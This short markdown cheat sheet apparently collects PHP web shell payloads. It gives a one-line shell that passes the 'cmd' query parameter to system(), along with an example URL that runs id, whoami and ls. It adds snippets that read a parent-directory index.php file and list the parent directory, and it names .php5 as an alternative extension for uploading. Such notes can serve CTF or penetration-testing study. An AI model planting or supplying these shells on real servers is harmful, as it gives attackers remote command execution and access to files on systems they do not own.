# php web shell scripts

## basic
{url}/file.php?cmd=id;whoami;ls
```php
<?php
    echo system($_GET["cmd"]);
?>   
```

## cat file
```php
echo file_get_contents('../index.php')
?>```


## ls dir
```php
<?php
function listFilesInParentDir($dir) {
    $directoryIterator = new DirectoryIterator($dir);
    foreach ($directoryIterator as $file) {
        // if ($file->isFile()) {
            echo $file->getFilename() . PHP_EOL;
        // }
    }
}
$parentDir = realpath(__DIR__ . '/../');
listFilesInParentDir($parentDir);
?>
```

## alternative file extensions
.php5
